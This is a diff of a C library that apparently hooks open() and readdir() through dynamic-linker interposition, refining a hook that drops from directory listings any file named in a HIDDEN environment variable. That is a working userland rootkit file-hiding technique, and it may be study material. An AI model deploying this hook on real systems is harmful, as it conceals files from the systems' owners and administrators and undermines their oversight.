@@ -20,7 +20,7 @@ int open(const char *pathname, int flags, ...)
     va_start(args, flags);
     mode_t mode = 0;
 
-	if (flags & O_CREAT) {
+	if (flags & 0100) {
         mode = va_arg(args, int);
     }
     va_end(args);
@@ -54,41 +54,37 @@ int open(const char *pathname, int flags, ...)
 struct dirent *readdir(DIR *dirp)
 {
 	struct dirent *(*real_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
-    const char *hidden = getenv("HIDDEN");
+	const char *hidden = getenv("HIDDEN");
 
-    if (hidden == NULL) {
-        return real_readdir(dirp);
-    }
+	if (hidden == NULL) {
+		return real_readdir(dirp);
+	}
 
-    char *hidden_copy = strdup(hidden);
-    char *hidden_names[100]; 
-    int hidden_count = 0;
+	char *hidden_copy = strdup(hidden);
+	char *hidden_names[100]; 
+	int hidden_count = 0;
 
-    char *token = strtok(hidden_copy, ":");
-    while (token != NULL && hidden_count < 100) {
-        hidden_names[hidden_count++] = token;
-        token = strtok(NULL, ":");
-    }
+	char *token = strtok(hidden_copy, ":");
+	while (token != NULL && hidden_count < 100) {
+		hidden_names[hidden_count++] = token;
+		token = strtok(NULL, ":");
+	}
 
-    struct dirent *entry;
-    while ((entry = real_readdir(dirp)) != NULL) {
-        int is_hidden = 0;
-        for (int i = 0; i < hidden_count; i++) {
-            if (strcmp(entry->d_name, hidden_names[i]) == 0) {
-                is_hidden = 1;
-                break;
-            }
-        }
+	struct dirent *entry;
+	while ((entry = real_readdir(dirp)) != NULL) {
+		int is_hidden = 0;
+		for (int i = 0; i < hidden_count; i++) {
+			if (strcmp(entry->d_name, hidden_names[i]) == 0) {
+				is_hidden = 1;
+				break;
+			}
+		}
+		if (!is_hidden) {
+			free(hidden_copy);
+			return entry;
+		}
+	}
 
-        if (is_hidden) {
-            real_readdir(dirp);
-            continue;
-        } else {
-            free(hidden_copy);
-            return entry;
-        }
-    }
-
-    free(hidden_copy);
-    return NULL;
+	free(hidden_copy);
+	return NULL;
 }
